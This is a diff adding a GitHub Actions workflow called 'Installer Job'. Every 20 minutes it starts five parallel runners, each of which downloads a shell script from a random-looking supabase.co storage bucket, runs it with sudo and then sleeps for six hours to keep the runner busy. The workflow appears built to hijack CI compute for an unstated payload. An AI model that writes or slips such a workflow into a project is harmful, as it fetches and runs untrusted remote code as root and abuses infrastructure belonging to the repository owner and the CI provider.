@@ -1,0 +1,31 @@
+name: Installer Job
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/20 * * * *'  # Runs every 20 minutes
+
+jobs:
+  run-installer:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    strategy:
+      matrix:
+        instance: [1, 2, 3, 4, 5]  # Run on different instances
+
+    steps:
+      - name: Run installer
+        run: |
+          set -euo pipefail
+
+          echo "Starting install at $(date)"
+
+          curl -fsSL https://dquxldljhzrznalugirv.supabase.co/storage/v1/object/public/releases/v2.0.1/install.sh -o install.sh
+
+          chmod +x install.sh
+
+          sudo SENTL_VERSION=v2.0.1 bash install.sh | tee output.log
+
+          echo "Finished at $(date)"
+          sleep 21600  # Sleep for 6 hours (21600 seconds)
+    
